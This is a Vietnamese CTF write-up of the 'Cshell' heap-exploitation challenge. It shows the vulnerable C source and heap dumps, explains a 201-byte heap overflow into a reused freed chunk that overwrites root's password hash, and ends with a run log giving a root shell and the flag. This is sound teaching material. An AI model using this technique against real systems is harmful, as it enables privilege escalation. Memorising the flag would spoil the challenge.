# Phân tích file

- File 64 bit, static và không stripped nên dễ cho việc debug hơn.

```c
Cshell: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=fa44f005a56ad5119764902311a39bbf09cbca23, for GNU/Linux 3.2.0, not stripped
```

- Checksec.

```c
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

# Reverse file.

- Tác giả cho sẵn source nên mình đỡ phải đọc ida.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <crypt.h>

//gcc Cshell.c -static -lcrypt -o Cshell
struct users {
	char name[8];
	char passwd[35];
};

struct tracker{
	struct tracker *next;
	struct users *ptr;
	char name[8];
	long int id;
};

char * alex_buff;
char * Charlie_buff;
char * Johnny_buff;
char * Eric_buff;

struct users *user;
struct users *root;

struct tracker *root_t;
struct tracker *user_t;

char *username[8];
char *userbuffer;
int uid=1000;
int length;
char salt[5] = "1337\0";
char *hash;
void setup(){
	char password_L[33];
	puts("Welcome to Cshell, a very restricted shell.\nPlease create a profile.");
	printf("Enter a username up to 8 characters long.\n> ");
	scanf("%8s",username);
	printf("Welcome to the system %s, you are our 3rd user. We used to have more but some have deleted their accounts.\nCreate a password.\n> ",username);
	scanf("%32s",&password_L);
	hash = crypt(password_L,salt);
	printf("How many characters will your bio be (200 max)?\n> ");
	scanf("%d",&length);
	userbuffer = malloc(length + 8);
	printf("Great, please type your bio.\n> ");
	getchar();
	fgets((userbuffer + 8),201,stdin);
}

void logout(){
	fflush(stdin);
	getchar();
	struct tracker *ptr;
	printf("Username:");
	char username_l[9];
	char password_l[32];
	char *hash;
	scanf("%8s",username_l);
	for (ptr = root_t; ptr != NULL; ptr = root_t->next) {

        if (strcmp(ptr->name, username_l) == 0) {
		printf("Password:");
	    scanf("%32s",password_l);
	    hash = crypt(password_l,salt);
	    if (strcmp(hash,ptr->ptr->passwd) == 0){
		    strcpy(username,ptr->name);
		    uid = ptr->id;
		    puts("Authenticated!");
		    menu();
	    }
	    else{
		    puts("Incorrect");
		    logout();
	    }
			 
        }
	else
	{
		if (ptr->next==0)
		{
			puts("Sorry no users with that name.");
			logout();
		}
	}
    }
}
void whoami(){
	printf("%s, uid: %d\n",username,uid);
	menu();
}
void bash(){

	if (uid == 0){
		system("bash");
	}
	else 
	{
		puts("Who do you think you are?");
		exit(0);
	}

}

void squad(){
	puts("..");
	menu();
}

void banner(){

puts("       /\\");
puts("      {.-}");
puts("     ;_.-'\\");
puts("    {    _.}_");
puts("    \\.-' /  `,");
puts("     \\  |    /");
puts("      \\ |  ,/");
puts("       \\|_/");
puts("");
}
void menu(){
	puts("+----------------------+");
	puts("|        Commands      |");
	puts("+----------------------+");
	puts("| 1. logout            |");
	puts("| 2. whoami            |");
	puts("| 3. bash (ROOT ONLY!) |");
	puts("| 4. squad             |");
	puts("| 5. exit              |");
	puts("+----------------------+");
	int option;
	printf("Choice > ");
	scanf("%i",&option);
	switch(option){
		case 1:
			logout();
		case 2:
			whoami();
		case 3:
			bash();
		case 4:
			squad();
		case 5:
			exit(0);
		default:
			puts("[!] invalid choice \n");
			break;
	}
}
void history(){
	alex_buff = malloc(0x40);
	char alex_data[0x40] = "Alex\nJust a user on this system.\0";
	char Johnny[0x50] = "Johnny\n Not sure why I am a user on this system.\0";
	char Charlie[0x50] ="Charlie\nI do not trust the security of this program...\0";
	char Eric[0x60] = "Eric\nThis is one of the best programs I have ever used!\0";
	strcpy(alex_buff,alex_data);
	Charlie_buff = malloc(0x50);
	strcpy(Charlie_buff,Charlie);
	Johnny_buff = malloc(0x60);
	strcpy(Johnny_buff,Johnny);
	Eric_buff = malloc(0x80);
	strcpy(Eric_buff,Eric);
	free(Charlie_buff);
	free(Eric_buff);
}

int main(){
	setvbuf(stdout, 0 , 2 , 0);
	setvbuf(stdin, 0 , 2 , 0);
	root_t = malloc(sizeof(struct tracker));
	user_t = malloc(sizeof(struct tracker));
	history();
	banner();
	user = malloc(sizeof(struct users )* 4);
	root = user + 1;
	strcpy(user->name,"tempname");
	strcpy(user->passwd,"placeholder");
	strcpy(root->name,"root");
	strcpy(root->passwd,"guessme:)");
	strcpy(root_t->name,"root");
	root_t->ptr = root;
	root_t->id = 0;
	root_t->next = user_t;
	setup();
	strcpy(user->name,username);
	strcpy(user->passwd,hash);
	strcpy(user_t->name,username);
	user_t->id=1000;
	user_t->ptr = user;
	user_t->next = NULL;
	menu();
	return 0;
}
```

- Ta thấy chương trình sẽ hoạt động như sau:
    - Ban đầu sẽ malloc 2 chunk với size là 0x20, sau đó gọi hàm history().

    ```c
    void history(){
    	alex_buff = malloc(0x40);
    	char alex_data[0x40] = "Alex\nJust a user on this system.\0";
    	char Johnny[0x50] = "Johnny\n Not sure why I am a user on this system.\0";
    	char Charlie[0x50] ="Charlie\nI do not trust the security of this program...\0";
    	char Eric[0x60] = "Eric\nThis is one of the best programs I have ever used!\0";
    	strcpy(alex_buff,alex_data);
    	Charlie_buff = malloc(0x50);
    	strcpy(Charlie_buff,Charlie);
    	Johnny_buff = malloc(0x60);
    	strcpy(Johnny_buff,Johnny);
    	Eric_buff = malloc(0x80);
    	strcpy(Eric_buff,Eric);
    	free(Charlie_buff);
    	free(Eric_buff);
    }
    ```

    - Ở hàm này sẽ malloc 4 chunk cho 4 user trên sau đó free Charlie_buff và Eric_buff. Vậy lúc này trong bin sẽ có 2 chunk với size là 0x50 và 0x80 sẵn sàng để chờ được malloc. Sau hàm history heap như sau:

        ```c
        0x5186b0:       0x0000000000000000      0x0000000000000031
        0x5186c0:       0x0000000000000000      0x0000000000000000
        0x5186d0:       0x0000000000000000      0x0000000000000000
        0x5186e0:       0x0000000000000000      0x0000000000000031
        0x5186f0:       0x0000000000000000      0x0000000000000000
        0x518700:       0x0000000000000000      0x0000000000000000
        0x518710:       0x0000000000000000      0x0000000000000051
        0x518720:       0x73754a0a78656c41      0x7265737520612074
        0x518730:       0x73696874206e6f20      0x2e6d657473797320
        0x518740:       0x0000000000000000      0x0000000000000000
        0x518750:       0x0000000000000000      0x0000000000000000
        0x518760:       0x0000000000000000      0x0000000000000061
        0x518770:       0x0000000000000518      0x0000000000517d90
        0x518780:       0x7420747375727420      0x7275636573206568
        0x518790:       0x7420666f20797469      0x676f727020736968
        0x5187a0:       0x00002e2e2e6d6172      0x0000000000000000
        0x5187b0:       0x0000000000000000      0x0000000000000000
        0x5187c0:       0x0000000000000000      0x0000000000000071
        0x5187d0:       0x200a796e6e686f4a      0x6572757320746f4e
        0x5187e0:       0x6120492079687720      0x726573752061206d
        0x5187f0:       0x73696874206e6f20      0x2e6d657473797320
        0x518800:       0x0000000000000000      0x0000000000000000
        0x518810:       0x0000000000000000      0x0000000000000000
        0x518820:       0x0000000000000000      0x0000000000000000
        0x518830:       0x0000000000000000      0x0000000000000091
        0x518840:       0x0000000000000518      0x0000000000517d90
        0x518850:       0x2065687420666f20      0x6f72702074736562
        0x518860:       0x204920736d617267      0x6576652065766168
        0x518870:       0x0021646573752072      0x0000000000000000
        0x518880:       0x0000000000000000      0x0000000000000000
        0x518890:       0x0000000000000000      0x0000000000000000
        0x5188a0:       0x0000000000000000      0x0000000000000000
        0x5188b0:       0x0000000000000000      0x0000000000000000
        0x5188c0:       0x0000000000000000      0x0000000000020741
        ```

    - Tiếp đến sẽ malloc 1 chunk cho user với size là 0xac ((8+35)*4). Chunk này ban đầu sẽ lưu name và pass của user và root và uid của root.

        ```c
                            tempname           placeholder
        0x5188d0:       0x656d616e706d6574      0x6c6f686563616c70
        0x5188e0:       0x0000000000726564      0x0000000000000000
        0x5188f0:       0x0000000000000000      0x00746f6f72000000   root
        0x518900:       0x7373657567000000      0x00000000293a656d   guess me
        0x518910:       0x0000000000000000      0x0000000000000000
        0x518920:       0x0000000000000000      0x0000000000000000
        0x518930:       0x0000000000000000      0x0000000000000000
        0x518940:       0x0000000000000000      0x0000000000000000
        0x518950:       0x0000000000000000      0x0000000000000000
        0x518960:       0x0000000000000000      0x0000000000000000
        0x518970:       0x0000000000000000      0x0000000000000000
        0x518980:       0x0000000000000000      0x0000000000020681
        ```

- Ở hàm setup() chương trình yêu cầu ta nhập username, password sau đó password sẽ được mã hóa với key '1337', ngoài ra còn yêu cầu ta nhập vào 1 size rồi malloc 1 chunk với size trên sau đó cho ta nhập input với len là 201 vậy malloc với size bất kì thì vẫn luôn nhập được 201 bytes => heap overflow.
- Ví dụ mình malloc với size 100:
    - Trước khi overflow:

        ```c
        0x518980:       0x0000000000000000      0x0000000000000081
        0x518990:       0x0000000000000000      0x0000000000000000
        0x5189a0:       0x0000000000000000      0x0000000000000000
        0x5189b0:       0x0000000000000000      0x0000000000000000
        0x5189c0:       0x0000000000000000      0x0000000000000000
        0x5189d0:       0x0000000000000000      0x0000000000000000
        0x5189e0:       0x0000000000000000      0x0000000000000000
        0x5189f0:       0x0000000000000000      0x0000000000000000
        0x518a00:       0x0000000000000000      0x0000000000020601 <- top chunk
        ```

    - Sau khi overflow:

        ```c
        0x518980:       0x0000000000000000      0x0000000000000081
        0x518990:       0x0000000000000000      0x6161616161616161
        0x5189a0:       0x6161616161616161      0x6161616161616161
        0x5189b0:       0x6161616161616161      0x6161616161616161
        0x5189c0:       0x6161616161616161      0x6161616161616161
        0x5189d0:       0x6161616161616161      0x6161616161616161
        0x5189e0:       0x6161616161616161      0x6161616161616161
        0x5189f0:       0x6161616161616161      0x6161616161616161
        0x518a00:       0x6161616161616161      0x6161616161616161 <- top chunk
        0x518a10:       0x6161616161616161      0x6161616161616161
        0x518a20:       0x6161616161616161      0x6161616161616161
        0x518a30:       0x6161616161616161      0x6161616161616161
        0x518a40:       0x6161616161616161      0x6161616161616161
        0x518a50:       0x6161616161616161      0x6161616161616161
        ```
- Ta có thể dùng bug trên để overwrite data vùng nhớ của chunk user thay đổi username và password của user hoặt root.
- Ở menu sẽ có 5 chức năng chính:

    ```c
    +----------------------+
    |        Commands      |
    +----------------------+
    | 1. logout            |
    | 2. whoami            |
    | 3. bash (ROOT ONLY!) |
    | 4. squad             |
    | 5. exit              |
    +----------------------+
    Choice >
    ```

    - logout:
        - Chương trình yêu cầu ta nhập username và password để login vào lại, nó sẽ check xem username đã tồn tại chưa, nếu có rồi thì nhập pass và check pass, nếu thỏa thì sẽ login với uid của người dùng.
    - whoami:
        - Đơn giản chỉ show ra cho ta xem người dùng có uid là bao nhiêu.
    - bash:
        - Hàm này sẽ cho phép ta thực hiện lệnh system bất kì nếu uid = 0(root)
    - squad và exit không có tác dụng lắm.

    # Exploit

    - Mục tiêu của ta sẽ login với root để có uid là 0 và thực hiện system("cat flag.txt")
    - Mình không biết được password của root để login nhưng để ý rằng ta có thể overwrite password của root nếu ta malloc size = 128(0x80), vì trong hàm history có free 2 chunk, nên giờ nó sẽ sử dụng lại vùng nhớ đó để malloc, và vùng nhớ này đứng trên vùng nhớ chứa username và password nên ta có thể overwrite.
    - Nhưng ta overwrite password của root thành gì khi nó so sánh hash(password,"1337") với cái ta overwrite. Ta thấy hàm crypt() dùng 1 key cố định là "1337" nên với đầu vào giống nhau thì đầu ra sẽ luôn giống nhau. Ví dụ đầu vào mình là "a"*8 thì đầu ra sẽ luôn là "13OTCcGbCo.BQ" vậy ta chỉ cần overwrite username, password của root thành 0x00746f6f72000000(root) 0x43544f3331000000(13OTC) 0x51422e6f43624763(cGbCo.BQ) ở dạng little endian. Như vậy khi ta login với username là root và password là "a"*8 ⇒ thành công và có uid là 0 có thể thực hiện bash.

```c
[+] Opening connection to pwn.be.ax on port 5001: Done
[*] Switching to interactive mode
       /\
      {.-}
     ;_.-'\
    {    _.}_
    \.-' /  `,
     \  |    /
      \ |  ,/
       \|_/

Welcome to Cshell, a very restricted shell.
Please create a profile.
Enter a username up to 8 characters long.
> Welcome to the system aaa, you are our 3rd user. We used to have more but some have deleted their accounts.
Create a password.
> How many characters will your bio be (200 max)?
> Great, please type your bio.
> +----------------------+
|        Commands      |
+----------------------+
| 1. logout            |
| 2. whoami            |
| 3. bash (ROOT ONLY!) |
| 4. squad             |
| 5. exit              |
+----------------------+
Choice > Username:Password:Authenticated!
+----------------------+
|        Commands      |
+----------------------+
| 1. logout            |
| 2. whoami            |
| 3. bash (ROOT ONLY!) |
| 4. squad             |
| 5. exit              |
+----------------------+
Choice > $ 2
root, uid: 0
+----------------------+
|        Commands      |
+----------------------+
| 1. logout            |
| 2. whoami            |
| 3. bash (ROOT ONLY!) |
| 4. squad             |
| 5. exit              |
+----------------------+
Choice > $ 3
$ cat flag.txt
corctf{tc4ch3_r3u5e_p1u5_0v3rfl0w_equ4l5_r007}
$
```
